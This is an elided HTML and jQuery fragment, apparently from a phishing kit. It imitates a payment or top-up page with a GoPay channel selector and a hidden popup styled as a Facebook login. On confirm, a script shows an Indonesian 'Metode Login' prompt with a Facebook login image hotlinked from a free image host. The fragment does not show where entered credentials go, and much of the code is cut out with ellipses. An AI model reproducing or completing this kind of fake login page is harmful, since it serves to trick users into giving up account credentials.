...
<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		...
		<div class="navbar-fb">
			<img src="https://i.im.ge/2021/09/15/Tw3QNy.png">
		</div>
                        ...
                        <div class="payment-channel-link" onclick="selectPaymentChannel(227, 'GoPay', false, false, false, false, false);">
                           ...
                           <div class="payment-channel-container">
                              <figure class="payment-logo-container">
                                 <img class="logo" src="https://i.postimg.cc/2j0xVjvG/GO-PAY-CHNL-LOGO.png" alt="GO_PAY logo" />
                              </figure>
                           </div>
                        ...
                        success: function(response) {
                           ...
                           if(!$.trim(response)) {
                              ...
                              $("#doConfirm").on("click", function() {
                                 ...
                                 $("#errorMessage").html('<center><h4>Metode Login :</h4><div class="imgLogin" style="display:block; margin: auto; margin-top: 20px;"><img id="fbAlexHost" src="https://i.postimg.cc/8CCtc8Yx/fb-login.png" alt="" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;">  </div></center>');
                                 $("#overlay").show();
                                 $(".popError").show();
                                 $("#hidePopError").hide();
